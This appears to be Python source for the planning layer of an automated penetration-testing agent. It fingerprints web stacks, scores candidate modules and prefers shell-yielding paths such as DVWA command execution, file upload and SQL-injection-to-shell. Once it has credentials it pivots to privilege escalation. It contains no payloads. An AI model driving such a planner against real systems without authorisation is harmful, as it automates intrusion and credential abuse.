        if row.get("error"):
            return False, f"HTTP probe failed for {url}: {row.get('error')}"
        status = int(row.get("status") or 0)
        if self._result_waf_signal({
            "status_code": status,
            "body": row.get("body", ""),
            "details": row.get("headers", {}),
        }):
            self._record_waf_signals_from_results(state, [{
                "status_code": status,
                "body": row.get("body", ""),
                "details": row.get("headers", {}),
            }], "reachability-probe")
        return True, f"HTTP probe reached target and returned status {status}."

    def _result_has_exploit_link(self, result: dict) -> bool:
        if not isinstance(result, dict):
            return False
        if self._catalog.normalize_exploit_module_path(result.get("exploit_module")):
            return True
        return bool(self._catalog.normalize_linked_module_paths(result.get("linked_modules")))

    def _record_module_performance_phase(
        self,
        state: AgentState,
        kb_before_light: dict,
        phase_results: list,
        phase_name: str,
    ) -> None:
        if not phase_results:
            return
        kb_after = kb_light_copy(state.knowledge_base)
        self._module_perf.record_phase_results(
            kb_before_light,
            kb_after,
            phase_results,
            phase_name,
            str(state.target_info.get("hostname", "") or ""),
            self._is_actionable_finding,
            self._result_has_exploit_link,
        )
        self._module_ctx.record_phase_results(
            kb_before_light,
            kb_after,
            phase_results,
            phase_name,
            self._is_actionable_finding,
            self._result_has_exploit_link,
        )
        try:
            self._learning.record_phase_results(
                state,
                kb_before_light,
                kb_after,
                phase_results,
                phase_name,
                get_agent_metadata=self._catalog.get_agent_metadata,
            )
        except Exception:
            pass
        self._module_health.record_phase_outcomes(
            kb_before_light,
            kb_after,
            phase_results,
            hostname=str(state.target_info.get("hostname", "") or ""),
            is_actionable=self._is_actionable_finding,
            get_agent_metadata=self._catalog.get_agent_metadata,
            stack_mismatch_fn=self._module_stack_mismatch_reason,
        )

    def _merge_module_produces_into_kb(self, knowledge_base: Any, module_path: str, details: Any) -> None:
        """Merge static ``agent.produces`` and optional runtime ``details['agent_produces']`` into KB."""
        from interfaces.command_system.builtin.agent.agent_module_meta import merge_produces_into_kb

        produces: List[str] = []
        agent = self._catalog.get_agent_metadata(module_path)
        if isinstance(agent, dict):
            produces.extend(agent.get("produces") or [])
        if isinstance(details, dict):
            extra = details.get("agent_produces") or details.get("produces")
            if isinstance(extra, (list, tuple)):
                produces.extend(str(x) for x in extra if str(x).strip())
            elif isinstance(extra, str) and extra.strip():
                produces.append(extra.strip())
        merge_produces_into_kb(knowledge_base, module_path, produces)

    def _bootstrap_knowledge_from_host_profile(self, state: AgentState) -> None:
        target_info = state.target_info or {}
        host = str(target_info.get("hostname", "")).lower().strip()
        if not host:
            return

        profiles = self._load_host_profiles()
        host_profile = profiles.get(host, {})
        if not isinstance(host_profile, dict):
            host_profile = {}
        state.host_profile = host_profile
        if not host_profile:
            return

        kb = state.knowledge_base
        kb["tech_hints"] = sorted(set(kb.get("tech_hints", [])) | set(host_profile.get("tech_hints", [])))
        kb["specializations"] = sorted(set(kb.get("specializations", [])) | set(host_profile.get("specializations", [])))
        kb["discovered_endpoints"] = sorted(
            set(kb.get("discovered_endpoints", [])) | set(host_profile.get("discovered_endpoints", []))
        )[:300]
        kb["discovered_params"] = sorted(
            set(kb.get("discovered_params", [])) | set(host_profile.get("discovered_params", []))
        )[:200]
        kb["login_paths"] = sorted(
            set(kb.get("login_paths", [])) | set(host_profile.get("login_paths", []))
        )[:40]
        merged_confidence = dict(kb.get("tech_confidence", {}))
        for tech, value in host_profile.get("tech_confidence", {}).items():
            try:
                merged_confidence[str(tech).lower()] = max(
                    float(merged_confidence.get(str(tech).lower(), 0.0)),
                    min(max(float(value), 0.0), 1.0),
                )
            except Exception:
                continue
        kb["tech_confidence"] = merged_confidence
        state.knowledge_base = kb

    def _load_host_profiles(self):
        profile_path = self._memory_path("host_profiles.json")
        return load_json_dict(profile_path)

    def _update_host_profile_cache(self, state: AgentState) -> None:
        target_info = state.target_info or {}
        host = str(target_info.get("hostname", "")).lower().strip()
        if not host:
            return

        profile_path = self._memory_path("host_profiles.json")
        os.makedirs(os.path.dirname(profile_path), exist_ok=True)
        profiles = self._load_host_profiles()
        kb = state.knowledge_base

        profiles[host] = {
            "updated_at": datetime.now().isoformat(),
            "tech_hints": kb.get("tech_hints", [])[:50],
            "specializations": kb.get("specializations", [])[:20],
            "tech_confidence": kb.get("tech_confidence", {}),
            "discovered_endpoints": kb.get("discovered_endpoints", [])[:200],
            "discovered_params": kb.get("discovered_params", [])[:120],
            "login_paths": kb.get("login_paths", [])[:40],
            "risk_signals": kb.get("risk_signals", [])[:30],
            "last_campaign_stop_reason": state.campaign_stop_reason,
        }
        try:
            atomic_write_json(profile_path, profiles)
        except Exception as exc:
            self._record_agent_error(
                state,
                "host_profile_persistence",
                exc,
                phase="report",
            )

    def _update_tech_confidence(self, knowledge_base, tech_key: str, delta: float) -> None:
        if not isinstance(knowledge_base, dict) or not tech_key:
            return
        confidence = dict(knowledge_base.get("tech_confidence", {}))
        key = str(tech_key).lower()
        current = float(confidence.get(key, 0.0) or 0.0)
        confidence[key] = round(max(0.0, min(1.0, current + float(delta))), 3)
        knowledge_base["tech_confidence"] = confidence

    def _extract_adaptive_keywords(self, text: str):
        stop = {
            "http", "https", "status", "server", "content", "type", "length", "cache",
            "found", "detect", "detected", "version", "target", "error", "warning",
            "vulnerable", "safe", "false", "true", "admin", "login", "panel", "path",
            "page", "request", "response", "header", "headers", "apache", "nginx",
            "bypass", "close", "config", "crawl", "plugin", "plugins", "extract",
            "file", "files", "signal", "scanner", "scanners", "missing", "information",
            "leak", "leaks", "detector", "detecteds",
        }.union(CMS_LOCK_NAMES)
        words = WORD_RE.findall((text or "").lower())
        unique = []
        seen = set()
        for word in words:
            if word in stop or word.isdigit():
                continue
            if word in seen:
                continue
            seen.add(word)
            unique.append(word)
            if len(unique) >= 20:
                break
        return unique

    def _display_hint_noise_tokens(self) -> set:
        return {
            "api",  # keep confidence, but avoid noisy plain display unless confidence is high
            "bypass", "close", "config", "cors", "crawl", "extract", "file",
            "header", "headers", "information", "leak", "plugin", "plugins",
            "scanner", "signal", "target", "warning", "error",
        }

    def _detect_app_stack_markers(self, text: str) -> List[str]:
        low = str(text or "").lower()
        markers: List[str] = []
        if "dvwa" in low or "damn vulnerable web application" in low:
            markers.append("dvwa")
        if "phpmyadmin" in low:
            markers.append("phpmyadmin")
        return markers

    def _preferred_post_auth_exploit_paths(self, knowledge_base: Dict[str, Any]) -> List[str]:
        kb = knowledge_base if isinstance(knowledge_base, dict) else {}
        allowed = set(kb.get("module_capability_catalog", {}).get("all_paths", []) or [])
        conf = kb.get("tech_confidence", {}) or {}
        preferred: List[str] = []

        try:
            dvwa_score = float(conf.get("dvwa", 0.0) or 0.0)
        except Exception:
            dvwa_score = 0.0
        if dvwa_score >= 0.7:
            for path in (
                "exploits/ctf/dvwa_rce",
                "exploits/ctf/dvwa_file_upload",
            ):
                if path in allowed:
                    preferred.append(path)
        return preferred

    def _post_auth_candidate_sort_key(self, path: str, knowledge_base: Dict[str, Any]) -> Tuple[int, int, str]:
        low = str(path or "").lower()
        preferred = self._preferred_post_auth_exploit_paths(knowledge_base)
        if path in preferred:
            return (0, preferred.index(path), low)
        if "dvwa" in low:
            return (1, 0, low)
        if low.startswith(("exploits/", "exploit/")):
            return (2, 0, low)
        return (3, 0, low)

    def _stack_confidence_rows(self, knowledge_base: Dict[str, Any], threshold: float = 0.35) -> List[Tuple[str, float]]:
        kb = knowledge_base if isinstance(knowledge_base, dict) else {}
        conf = kb.get("tech_confidence", {}) or {}
        known = (
            "dvwa", "mutillidae", "wordpress", "drupal", "joomla", "phpmyadmin", "grafana", "jenkins",
            "elasticsearch", "kibana", "tomcat", "nginx", "apache", "fastapi",
            "django", "flask", "nextjs", "nodejs", "react", "angular", "vue", "api",
        )
        rows: List[Tuple[str, float]] = []
        for name in known:
            try:
                value = float(conf.get(name, 0.0) or 0.0)
            except Exception:
                value = 0.0
            if value >= threshold:
                rows.append((name, value))
        rows.sort(key=lambda row: row[1], reverse=True)
        return rows

    def _display_tech_hints(self, knowledge_base: Dict[str, Any], limit: int = 6) -> List[str]:
        kb = knowledge_base if isinstance(knowledge_base, dict) else {}
        hints = [str(x).lower() for x in kb.get("tech_hints", []) or []]
        conf_rows = self._stack_confidence_rows(kb, threshold=0.4)
        preferred = [name for name, _ in conf_rows]
        if preferred:
            return preferred[:limit]
        noise = self._display_hint_noise_tokens()
        filtered = [h for h in hints if h and h not in noise]
        return filtered[:limit]

    def _has_nextjs_evidence(self, knowledge_base: Dict[str, Any], threshold: float = 0.55) -> bool:
        kb = knowledge_base if isinstance(knowledge_base, dict) else {}
        if self._has_tech_evidence(kb, "nextjs", threshold=threshold):
            return True
        endpoints = " ".join(str(x).lower() for x in kb.get("discovered_endpoints", []) or [])
        trace = " ".join(
            " ".join(str(row.get(key, "")) for key in ("url", "path", "final_url", "body"))
            for row in (kb.get("fingerprint_trace", []) or [])
            if isinstance(row, dict)
        ).lower()
        request_intel = kb.get("request_intel", {}) if isinstance(kb.get("request_intel", {}), dict) else {}
        request_hints = {str(x).lower() for x in request_intel.get("tech_hints", []) or []}
        if "nextjs" in request_hints:
            return True
        return any(token in endpoints or token in trace for token in NEXTJS_HINT_TOKENS)

    def _module_stack_mismatch_reason(self, path: str, knowledge_base: Dict[str, Any]) -> str:
        from interfaces.command_system.builtin.agent.module_stack_gate import resolve_module_stack_mismatch

        kb = knowledge_base if isinstance(knowledge_base, dict) else {}
        agent = self._catalog.get_agent_metadata(path)
        return resolve_module_stack_mismatch(
            path,
            kb,
            agent,
            has_tech_evidence=lambda tech, threshold=0.65: self._has_tech_evidence(kb, tech, threshold),
            has_nextjs_evidence=lambda: self._has_nextjs_evidence(kb),
        )

    def _filter_stack_compatible_paths(self, paths: List[str], knowledge_base: Dict[str, Any]) -> List[str]:
        compatible = []
        for path in paths or []:
            if self._module_stack_mismatch_reason(path, knowledge_base):
                continue
            compatible.append(path)
        return compatible

    def _action_reason_for_path(self, path: str, state: AgentState, findings: Optional[List[Any]] = None) -> str:
        low = str(path or "").lower()
        kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
        conf_rows = self._stack_confidence_rows(kb, threshold=0.4)
        top_stack = conf_rows[0][0] if conf_rows else ""
        top_stack_score = conf_rows[0][1] if conf_rows else 0.0
        # Prefer concrete CMS evidence over a generic "api" top-stack when choosing follow-ups.
        if top_stack == "api" and conf_rows:
            for name, score in conf_rows[1:4]:
                if name in {"drupal", "wordpress", "joomla", "phpmyadmin"} and float(score or 0.0) >= 0.45:
                    top_stack = name
                    top_stack_score = float(score or 0.0)
                    break
        findings = findings or []

        if "wp_plugin_scanner" in low:
            return (
                f"WordPress validation: stack confidence={top_stack_score:.2f}"
                if top_stack == "wordpress"
                else "WordPress validation based on observed WordPress-like evidence."
            )
        if "wordpress_enum_user" in low:
            return "WordPress follow-up: enumerate likely public users after WordPress evidence."
        if low.endswith("scanner/http/wordpress_detect"):
            return "Stack validation: confirm WordPress before broader follow-up."
        if "phpmyadmin_detect" in low:
            return "Validate phpMyAdmin exposure before treating it as actionable."
        if "dvwa_rce" in low:
            return "DVWA detected after authentication; command execution path is the highest-value exploit."
        if "dvwa_file_upload" in low:
            return "DVWA detected after authentication; file upload is a grounded shell path."
        if "login_page_detector" in low:
            return "Validate authentication surface before any credential strategy."
        if "admin_login_bruteforce" in low:
            return "Auth-first follow-up on a known login surface."
        if "sqli_engine" in low or "sql_injection" in low:
            return "Crawl-driven surface: validate SQLi with sqli_engine (minimal probes)."
        if "xss_scanner" in low:
            return "Parameter-rich surface detected; validate reflected/stored XSS paths."
        if "lfi_fuzzer" in low:
            return "File/path-like parameters detected; validate LFI risk."
        if top_stack:
            return f"Best next validation step for probable stack `{top_stack}` ({top_stack_score:.2f})."
        if findings:
            return "Best low-noise validation step from current evidence."
        return "Best next low-noise validation step."

    def _action_matching_findings(self, path: str, findings: Optional[List[Any]] = None) -> List[Dict[str, Any]]:
        """Return findings that directly justify a planned action path."""
        low = str(path or "").strip().lower()
        if not low:
            return []

        exact: List[Dict[str, Any]] = []
        fuzzy: List[Dict[str, Any]] = []
        base = low.rstrip("/").split("/")[-1]
        for item in findings or []:
            if not isinstance(item, dict):
                continue
            finding_path = str(item.get("path", "") or "").strip().lower()
            exploit_path = str(self._catalog.normalize_exploit_module_path(item.get("exploit_module")) or "").lower()
            linked_paths = [
                str(p).strip().lower()
                for p in self._catalog.normalize_linked_module_paths(item.get("linked_modules"))
            ]
            if low == finding_path or low == exploit_path or low in linked_paths:
                exact.append(item)
                continue
            if len(base) >= 8:
                blob = " ".join([
                    finding_path,
                    exploit_path,
                    " ".join(linked_paths),
                    str(item.get("module", "") or "").lower(),
                    str(item.get("message", "") or "").lower(),
                ])
                if base in blob:
                    fuzzy.append(item)

        rows = exact or fuzzy
        return sorted(rows, key=lambda row: float(row.get("context_score", 0.0) or 0.0), reverse=True)

    def _action_decision_explanation(
        self,
        action: Dict[str, Any],
        state: AgentState,
        findings: Optional[List[Any]] = None,
    ) -> Dict[str, Any]:
        """Build an auditable explanation for a planner action."""
        action_type = str(action.get("type", "") or "").strip().lower()
        path = str(action.get("path", "") or "").strip()
        low = path.lower()
        kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
        matching = self._action_matching_findings(path, findings)
        top = matching[0] if matching else {}
        reason = self._action_reason_for_path(path, state, findings)

        evidence: List[str] = []
        tradeoffs: List[str] = []
        goal = str(getattr(state, "campaign_goal", "") or "").strip()
        if goal:
            evidence.append(f"campaign_goal={goal}")

        if top:
            msg = self._shorten_text(top.get("message", ""), 150)
            if msg:
                evidence.append(f"matched_finding={msg}")
            decision_class = str(top.get("decision_class", "") or "").strip()
            if decision_class:
                evidence.append(f"decision_class={decision_class}")
            context_hints = [str(x) for x in (top.get("context_hints", []) or []) if str(x).strip()]
            if context_hints:
                evidence.append("context_hints=" + ",".join(context_hints[:4]))
            if self._catalog.normalize_exploit_module_path(top.get("exploit_module")):
                evidence.append("direct_exploit_link=true")

        conf_rows = self._stack_confidence_rows(kb, threshold=0.4)
        if conf_rows:
            evidence.append(f"stack={conf_rows[0][0]}:{conf_rows[0][1]:.2f}")

        login_paths = [str(p) for p in kb.get("login_paths", []) or [] if str(p).startswith("/")]
        if login_paths and any(token in low for token in ("login", "auth", "bruteforce")):
            evidence.append(f"login_paths={len(login_paths)}")

        signals = [str(x).lower() for x in kb.get("risk_signals", []) or [] if str(x).strip()]
        useful_signals = [
            s for s in signals
            if s in (
                "authenticated_session",
                "credentials_obtained",
                "login_surface_detected",
                "login_form_detected",
                "waf_or_blocking_detected",
                "dom_xss_signal",
                "sqli_engine",
                "sql_injection",
            )
        ]
        if useful_signals:
            evidence.append("signals=" + ",".join(useful_signals[:5]))

        request_intel = kb.get("request_intel", {}) if isinstance(kb.get("request_intel", {}), dict) else {}
        if int(request_intel.get("analyzed_flows", 0) or 0) > 0:
            evidence.append(f"http_flows={request_intel.get('analyzed_flows', 0)}")

        memory_evidence, memory_tradeoffs = self._module_memory_decision_notes(path, state)
        evidence.extend(memory_evidence)
        tradeoffs.extend(memory_tradeoffs)

        expected_gain = 1.0
        if action_type == "run_exploit":
            expected_gain += 2.2
        elif action_type == "run_followup":
            expected_gain += 1.2
        elif action_type == "prioritize":
            expected_gain += 0.5

        if top:
            expected_gain += min(3.0, max(0.0, float(top.get("context_score", 0.0) or 0.0)) / 3.0)
            if top.get("decision_class") == "exploit":
                expected_gain += 1.0
            elif top.get("decision_class") == "followup":
                expected_gain += 0.45
        if "authenticated_session" in signals and action_type == "run_exploit":
            expected_gain += 0.8
        if any(token in low for token in ("rce", "shell", "upload", "command")):
            expected_gain += 0.7
        if any(token in low for token in ("login", "bruteforce")) and login_paths:
            expected_gain += 0.55

        signals_lower = {str(x).lower() for x in kb.get("risk_signals", []) or []}
        if is_shell_operator_goal(self._operator_campaign_goal(state)):
            if "sqli_confirmed" in signals_lower or "sql_signal" in signals_lower or parked_sqli_branches(kb):
                if "sqli_shell" in low:
                    expected_gain += 4.5
                    evidence.append("sqli_confirmed_resume_deep=true")
                elif any(token in low for token in ("sql_injection", "sqli_engine", "sqli")):
                    expected_gain += 1.5
                if "bruteforce" in low or "admin_login" in low:
                    expected_gain -= 1.2
                    tradeoffs.append("sqli confirmed — deprioritized vs shell-from-sqli path")
        if action_type == "run_post" and "sqli_shell" in low:
            expected_gain += 2.5

        risk_cost = float(estimate_network_cost(low))
        if action_type == "run_exploit":
            risk_cost += 1.25
        if "bruteforce" in low:
            risk_cost += 1.1
        if any(token in low for token in ("crawler", "fuzzer", "fuzz")):
            risk_cost += 0.8
        profile = self._normalized_safety_profile(state)
        if profile in ("safe", "discreet"):
            risk_cost += 0.35
            tradeoffs.append(f"safety_profile={profile}")
        if "waf_or_blocking_detected" in signals:
            risk_cost += 1.2
            tradeoffs.append("blocking/WAF signal increases execution risk")

        block_reason = self._module_block_reason_for_profile(state, path)
        if block_reason:
            risk_cost += 2.0
            tradeoffs.append(block_reason)

        if top:
            factors = top.get("risk_factors", {}) if isinstance(top.get("risk_factors", {}), dict) else {}
            confidence = float(factors.get("confidence", 0.72) or 0.72)
        elif evidence:
            confidence = 0.64
        else:
            confidence = 0.46
        if action_type == "run_exploit" and not any("direct_exploit_link=true" == e for e in evidence):
            confidence -= 0.12
            tradeoffs.append("exploit path is inferred rather than directly linked")
        if "possible" in " ".join(evidence).lower() or "potential" in " ".join(evidence).lower():
            confidence -= 0.1
        confidence = max(0.1, min(1.0, confidence))

        score = max(0.0, (expected_gain * confidence * 2.0) - (risk_cost * 0.35))
        if not tradeoffs and action_type == "run_followup":
            tradeoffs.append("validation-first step before higher-risk exploitation")

        base = {
            "reason": reason,
            "score": round(score, 3),
            "confidence": round(confidence, 3),
            "expected_gain": round(expected_gain, 3),
            "risk_cost": round(risk_cost, 3),
            "evidence": evidence[:8],
            "tradeoffs": tradeoffs[:5],
        }
        report = build_action_decision_report(
            path,
            action_type,
            kb,
            campaign_goal=str(getattr(state, "campaign_goal", "") or ""),
            phase=str(getattr(state, "current_phase", "") or "plan"),
            reason=reason,
            matching_finding=top or None,
            stack_mismatch_fn=self._module_stack_mismatch_reason,
            evidence=evidence[:8],
            tradeoffs=tradeoffs[:5],
            score=base["score"],
            confidence=base["confidence"],
            expected_gain=base["expected_gain"],
            risk_cost=base["risk_cost"],
        )
        base.update(report)
        return base

    def _filter_plan_actions_for_policy(
        self,
        state: AgentState,
        actions: List[Dict[str, Any]],
        *,
        phase: str = "plan",
    ) -> List[Dict[str, Any]]:
        filtered: List[Dict[str, Any]] = []
        for row in actions or []:
            if not isinstance(row, dict):
                continue
            path = str(row.get("path", "") or "").strip()
            if not path:
                filtered.append(row)
                continue
            reason = self._module_block_reason_for_profile(state, path)
            if reason:
                self._remember_policy_rejection(state, path, reason, phase=phase)
                continue
            filtered.append(row)
        for idx, row in enumerate(filtered, start=1):
            if isinstance(row, dict):
                row["priority"] = idx
        return filtered

    def _enrich_execution_plan_actions(
        self,
        state: AgentState,
        plan: Dict[str, Any],
        findings: Optional[List[Any]] = None,
    ) -> Dict[str, Any]:
        """Attach decision explanations to every planner action."""
        out = dict(plan or {})
        actions = []
        raw_actions = [
            row for row in (out.get("next_actions", []) or [])
            if isinstance(row, dict)
        ]
        raw_actions = self._filter_plan_actions_for_policy(
            state,
            raw_actions,
            phase=str(getattr(state, "current_phase", "") or "plan"),
        )
        for row in raw_actions:
            if not isinstance(row, dict):
                continue
            enriched = dict(row)
            explanation = self._action_decision_explanation(enriched, state, findings)
            enriched["decision_explanation"] = explanation
            enriched["decision_score"] = explanation["score"]
            enriched["confidence"] = explanation["confidence"]
            enriched.setdefault("reason", explanation["reason"])
            actions.append(enriched)
        out["next_actions"] = actions
        return out

    def _match_keywords_to_catalog(self, knowledge_base, keywords):
        catalog_paths = []
        if isinstance(knowledge_base, dict):
            catalog_paths = [str(p).lower() for p in knowledge_base.get("module_capability_catalog", {}).get("all_paths", [])]
        if not catalog_paths:
            return []
        matched = []
        for kw in keywords:
            if any(kw in path for path in catalog_paths):
                matched.append(kw)
            if len(matched) >= 10:
                break
        return matched

    def _extract_post_auth_lexical_tokens(self, text):
        """
        Tokens from authenticated HTML for generic module-path matching (no hardcoded apps).
        """
        if not text:
            return []
        stripped = SCRIPT_RE.sub(" ", text)
        stripped = STYLE_RE.sub(" ", stripped)
        stripped = TAG_RE.sub(" ", stripped)
        low = stripped.lower()
        stop = {
            "html", "body", "head", "meta", "link", "script", "style", "div", "span", "table",
            "tr", "td", "th", "form", "input", "button", "select", "option", "label", "title",
            "href", "http", "https", "charset", "viewport", "width", "height", "class", "charset",
            "this", "that", "with", "from", "your", "have", "been", "will", "here", "there",
            "please", "click", "welcome", "logout", "login", "password", "username", "submit",
            "none", "true", "false", "text", "javascript", "window", "document",
        }
        words = POST_AUTH_WORD_RE.findall(low)
        acronyms = ACRONYM_RE.findall(low)
        out = []
        seen = set()
        for w in list(words) + [a for a in acronyms if len(a) >= 3]:
            if w in stop or w.isdigit():
                continue
            if w in seen:
                continue
            seen.add(w)
            out.append(w)
            if len(out) >= 40:
                break
        return out

    def _semantic_catalog_paths_from_text(self, knowledge_base, text: str, max_paths: int = 25) -> List[str]:
        if not text or not isinstance(knowledge_base, dict):
            return []
        semantic_index = (
            knowledge_base.get("module_capability_catalog", {}).get("semantic_index", []) or []
        )
        if not semantic_index:
            return []
        query_tokens = set(self._extract_post_auth_lexical_tokens(text))
        query_tokens.update(self._extract_adaptive_keywords(text))
        query_tokens = {tok for tok in query_tokens if len(str(tok)) >= 3}
        if not query_tokens:
            return []

        scored: List[Tuple[float, str]] = []
        for row in semantic_index:
            if not isinstance(row, dict):
                continue
            path = str(row.get("path", "") or "").strip()
            tokens = {str(tok).lower() for tok in (row.get("tokens") or []) if str(tok).strip()}
            if not path or not tokens:
                continue
            overlap = query_tokens.intersection(tokens)
            if not overlap:
                continue
            score = len(overlap) / max(1.0, (len(query_tokens) * len(tokens)) ** 0.5)
            if score > 0:
                scored.append((score, path))
        scored.sort(key=lambda item: (-item[0], item[1]))
        return [path for _, path in scored[:max_paths]]

    def _resolve_catalog_paths_from_text(self, knowledge_base, text, max_paths=25):
        if not text or not isinstance(knowledge_base, dict):
            return []
        paths = knowledge_base.get("module_capability_catalog", {}).get("all_paths", []) or []
        if not paths:
            return []
        tokens = sorted(set(self._extract_post_auth_lexical_tokens(text)), key=len, reverse=True)
        matched = []
        seen = set()
        for path in self._semantic_catalog_paths_from_text(knowledge_base, text, max_paths=max_paths):
            if path not in seen:
                matched.append(path)
                seen.add(path)
            if len(matched) >= max_paths:
                return matched
        for tok in tokens:
            if len(tok) < 4:
                continue
            for p in paths:
                if p in seen:
                    continue
                pl = str(p).lower().replace("-", "_")
                if tok in pl:
                    matched.append(p)
                    seen.add(p)
                    if len(matched) >= max_paths:
                        return matched
        return matched

    def _post_auth_vector_is_disallowed(self, path_lower):
        """
        Responsible triage: avoid auto-chaining noisy / abuse-prone surfaces (email, mass messaging).
        """
        return any(b in path_lower for b in DISALLOWED_POST_AUTH_TOKENS)

    def _has_authenticated_session(self, knowledge_base) -> bool:
        kb = knowledge_base if isinstance(knowledge_base, dict) else {}
        signals = {str(x).lower() for x in kb.get("risk_signals", [])}
        return "authenticated_session" in signals

    def _credential_milestone_reached(self, knowledge_base) -> bool:
        """True when valid credentials or an authenticated session was recorded in the KB."""
        kb = knowledge_base if isinstance(knowledge_base, dict) else {}
        signals = {str(x).lower() for x in kb.get("risk_signals", [])}
        if "authenticated_session" in signals:
            return True
        return "credentials_obtained" in signals

    def _planner_action_keys(self, path: Any) -> set:
        text = str(path or "").strip().lower()
        if not text:
            return set()
        keys = {text}
        if "/" in text:
            keys.add(text.rstrip("/").split("/")[-1])
        return keys

    def _get_failed_action_keys(self, knowledge_base) -> set:
        kb = knowledge_base if isinstance(knowledge_base, dict) else {}
        failed = set()
        for item in kb.get("planner_failed_actions", []) or []:
            failed.update(self._planner_action_keys(item))
        return failed

    def _remember_planner_actions(self, knowledge_base, attempted_paths, failed_paths=None) -> None:
        kb = knowledge_base if isinstance(knowledge_base, dict) else None
        if kb is None:
            return

        attempted_tokens = set()
        for path in attempted_paths or []:
            attempted_tokens.update(self._planner_action_keys(path))
        failed_tokens = set()
        for path in failed_paths or []:
            failed_tokens.update(self._planner_action_keys(path))

        existing_attempted = set()
        for item in kb.get("planner_executed_actions", []) or []:
            existing_attempted.update(self._planner_action_keys(item))
        existing_failed = set()
        for item in kb.get("planner_failed_actions", []) or []:
            existing_failed.update(self._planner_action_keys(item))

        if attempted_tokens:
            kb["planner_executed_actions"] = sorted(existing_attempted.union(attempted_tokens))[:160]
        if failed_tokens:
            kb["planner_failed_actions"] = sorted(existing_failed.union(failed_tokens))[:160]

    def _filter_previously_failed_plan_actions(self, actions, knowledge_base):
        failed = self._get_failed_action_keys(knowledge_base)
        if not failed:
            return list(actions or [])
        filtered = []
        for row in actions or []:
            if not isinstance(row, dict):
                continue
            action_type = str(row.get("type", "")).strip().lower()
            path = str(row.get("path", "")).strip()
            if action_type in ("run_followup", "run_exploit") and self._planner_action_keys(path).intersection(failed):
                continue
            filtered.append(row)
        return filtered

    def _should_run_post_auth_methodical_wave(self, knowledge_base) -> bool:
        kb = knowledge_base if isinstance(knowledge_base, dict) else {}
        if kb.get("post_auth_methodical_wave_done"):
            return False
        signals = {str(x).lower() for x in kb.get("risk_signals", [])}
        if "authenticated_session" in signals:
            return True
        return (
            "credentials_obtained" in signals and "session_cookie_obtained" in signals
        )

    def _pivot_scan_campaign_after_credentials(
        self,
        state: AgentState,
        modules,
        scanner,
        all_results,
        executed_paths,
        phase_threads,
        tech_hints,
        verbose: bool,
        phase_label: str,
    ):
        self._ingest_sessions_from_scan_results(state, all_results)
        if self._has_shell_milestone(state):
            if verbose:
                print_status(
                    f"{phase_label}: shell/session already obtained — skipping HTTP post-auth pivot."
                )
            return self._finalize_scan_campaign(
                state,
                modules,
                scanner,
                all_results,
                executed_paths,
                phase_threads,
                tech_hints,
            )
        state.campaign_stop_reason = (
            f"{phase_label}: credentials obtained — halting broad scan; pivot to post-auth / privilege escalation"
        )
        if self._should_run_post_auth_methodical_wave(state.knowledge_base):
            post_auth_budget = min(12, max(3, int(state.max_modules) - len(executed_paths)))
            if self._discreet_mode(state):
                post_auth_budget = min(5, max(2, int(state.max_modules) - len(executed_paths)))
            self._run_post_auth_methodical_wave(
                state,
                modules,
                scanner,
                all_results,
                executed_paths,
                phase_threads,
                post_auth_budget,
            )
        if verbose:
            print_status(
                "Credential milestone: stopping generic recon/injection waves; "
                "focusing on authenticated follow-up and privilege paths."
            )
        for hint in state.knowledge_base.get("tech_hints", []) or []:
            tech_hints.add(str(hint).lower())
        state.scan_tech_hints = sorted(tech_hints)
        state.scan_modules_executed = len(executed_paths)
        return self._finalize_scan_campaign(
            state,
            modules,
            scanner,
            all_results,
            executed_paths,
            phase_threads,
            tech_hints,
        )

    def _has_tech_evidence(self, knowledge_base, tech_key: str, threshold: float = 0.6) -> bool:
        kb = knowledge_base if isinstance(knowledge_base, dict) else {}
        key = str(tech_key or "").lower().strip()
        if not key:
            return False
        confidence = kb.get("tech_confidence", {}) or {}
        try:
            if float(confidence.get(key, 0.0) or 0.0) >= threshold:
                return True
        except Exception:
            pass
        hints = {str(x).lower() for x in kb.get("tech_hints", [])}
        return key in hints

    def _get_probable_cms_specializations(self, knowledge_base):
        kb = knowledge_base if isinstance(knowledge_base, dict) else {}
        hints = {str(x).lower() for x in kb.get("tech_hints", [])}
        confidence = kb.get("tech_confidence", {}) or {}
        endpoints_blob = " ".join([str(x).lower() for x in kb.get("discovered_endpoints", [])])
        trace_blob = " ".join([
            " ".join([
                str(row.get("path", "")),
                str(row.get("final_path", "")),
                str(row.get("location", "")),
            ]).lower()
            for row in (kb.get("fingerprint_trace", []) or [])
            if isinstance(row, dict)
        ])

        probable = set()
        wp_conf = float(confidence.get("wordpress", 0.0) or 0.0)
        drupal_conf = float(confidence.get("drupal", 0.0) or 0.0)
        joomla_conf = float(confidence.get("joomla", 0.0) or 0.0)
        risk = {str(x).lower() for x in kb.get("risk_signals", [])}
        endpoints = [str(x).lower() for x in kb.get("discovered_endpoints", []) or []]
        multi_app_listing = (
            "directory_listing_detected" in risk
            and sum(
                1
                for ep in endpoints
                if ep.endswith(".php") or ep.endswith("/") and ep.count("/") <= 2
            )
            >= 2
        )

        if (
            wp_conf >= 0.5
            or (
                "wordpress" in hints
                and (
                    wp_conf >= 0.35
                    or any(token in f"{endpoints_blob} {trace_blob}" for token in WORDPRESS_LANDING_PATH_MARKERS)
                )
            )
        ):
            probable.add("wordpress")
        if "drupal" in hints:
            if multi_app_listing:
                if drupal_conf >= 0.5 or any(
                    token in endpoints_blob for token in ("sites/default", "x-drupal", "/core/", "drupal.js")
                ):
                    probable.add("drupal")
            elif drupal_conf >= 0.25:
                probable.add("drupal")
        if "joomla" in hints:
            if multi_app_listing:
                if joomla_conf >= 0.5 or "/administrator" in endpoints_blob:
                    probable.add("joomla")
            elif joomla_conf >= 0.25:
                probable.add("joomla")
        return probable

    def _wordpress_probe_signal(self, path: str, status: int, body: str, final_path: str = "", location: str = "") -> bool:
        low_body = str(body or "").lower()
        low_final = str(final_path or "").lower()
        low_location = str(location or "").lower()
        normalized = str(path or "").lower()

        if any(token in low_body for token in WORDPRESS_BODY_FINGERPRINT_TOKENS):
            return True
        if normalized == "/wp-json/" and (
            "wp-json" in low_body
            or "\"namespaces\"" in low_body
            or "rest_route" in low_body
        ):
            return True
        if normalized == "/xmlrpc.php" and (
            "xml-rpc server accepts post requests only" in low_body
            or "xmlrpc" in low_body
        ):
            return True
        if normalized == "/wp-login.php" and status in (200, 401, 403):
            if any(token in low_body for token in WORDPRESS_FORM_FIELD_TOKENS):
                return True
